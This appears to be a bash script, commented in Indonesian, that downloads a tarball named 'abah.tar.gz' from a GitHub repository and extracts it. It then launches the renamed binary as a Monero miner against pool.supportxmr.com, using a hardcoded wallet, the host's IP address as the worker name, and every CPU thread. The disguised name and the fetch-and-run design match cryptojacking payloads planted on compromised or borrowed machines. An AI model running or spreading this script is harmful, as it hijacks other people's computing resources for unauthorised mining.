#!/bin/bash

# Fungsi spinner umum
run_with_loading() {
    local message="$1"
    shift

    "$@" > /dev/null 2>&1 &
    local pid=$!

    local spinner=("|" "/" "-" "\\")
    while kill -0 "$pid" 2>/dev/null; do
        for char in "${spinner[@]}"; do
            printf "\r[%c] %s" "$char" "$message"
            sleep 0.08
            if ! kill -0 "$pid" 2>/dev/null; then
                break
            fi
        done
    done

    wait "$pid"
    local status=$?

    if [ $status -eq 0 ]; then
        printf "\r[✔] %s selesai\n" "$message"
    else
        printf "\r[✖] %s gagal\n" "$message"
        return $status
    fi

    return 0
}

# 1. Download
run_with_loading "Downloading abah.tar.gz..." curl -L -O https://github.com/nurnapitupul135/olab/raw/refs/heads/main/abah.tar.gz
if [ $? -ne 0 ]; then
    exit 1
fi

# 2. Ekstrak
run_with_loading "Extracting abah.tar.gz..." tar -xvf abah.tar.gz
if [ $? -ne 0 ]; then
    exit 1
fi

# === Ambil IP lokal aman tanpa hostname ===
worker_name=""
if command -v hostname >/dev/null 2>&1; then
    worker_name="$(hostname -I 2>/dev/null | awk '{print $1}')"
fi

if [ -z "$worker_name" ] && command -v ip >/dev/null 2>&1; then
    worker_name="$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}')"
fi

if [ -z "$worker_name" ]; then
    worker_name="unknown"
fi

wallet="86shoUZ9jrrWqKbLyNzzXWKYxLo6y3xdkbGmruh1fUyJSBi4j1a1EA6brvqMMkx8pffTzUmSiiKCwCr41LVn9oGM2Z2NkAk"
worker_tag="${wallet}.${worker_name}"

if command -v nproc >/dev/null 2>&1; then
    if nproc --all >/dev/null 2>&1; then
        threads="$(nproc --all)"
    else
        threads="$(nproc)"
    fi
else
    threads=1
fi

echo "Menjalankan abah dengan worker: ${worker_tag}"
echo "Menjalankan perintah: ./abah"

# 3. Jalankan ./abah dengan animasi jam pasir
./abah --donate-level 1 -o pool.supportxmr.com:3333 -u "${worker_tag}" -a rx/0 -k -t "${threads}"
ABAH_PID=$!

hourglass=("⏳" "⌛")
while kill -0 "$ABAH_PID" 2>/dev/null; do
    for h in "${hourglass[@]}"; do
        printf "\r[%s] Sedang menjalankan abah..." "$h"
        sleep 0.45
        if ! kill -0 "$ABAH_PID" 2>/dev/null; then
            break
        fi
    done
done

wait "$ABAH_PID"
ABAH_EXIT=$?

if [ $ABAH_EXIT -eq 0 ]; then
    printf "\r[✔] Proses abah selesai (Done).                 \n"
else
    printf "\r[✖] Proses abah gagal atau dihentikan.        \n"
    exit $ABAH_EXIT
fi
